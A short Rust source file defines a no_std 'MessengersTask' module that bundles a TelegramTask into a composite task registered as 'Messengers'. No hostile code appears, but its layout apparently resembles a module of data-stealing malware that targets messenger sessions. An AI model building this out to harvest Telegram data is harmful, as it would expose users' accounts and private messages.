#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

mod telegram;

extern crate alloc;

use alloc::vec;
use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
use crate::telegram::TelegramTask;

pub struct MessengersTask {
    inner: CompositeTask
}

impl MessengersTask {
    pub fn new() -> Self {
        Self {
            inner: composite_task!(
                TelegramTask
            )
        }
    }
}

impl_composite_task_runner!(MessengersTask, "Messengers");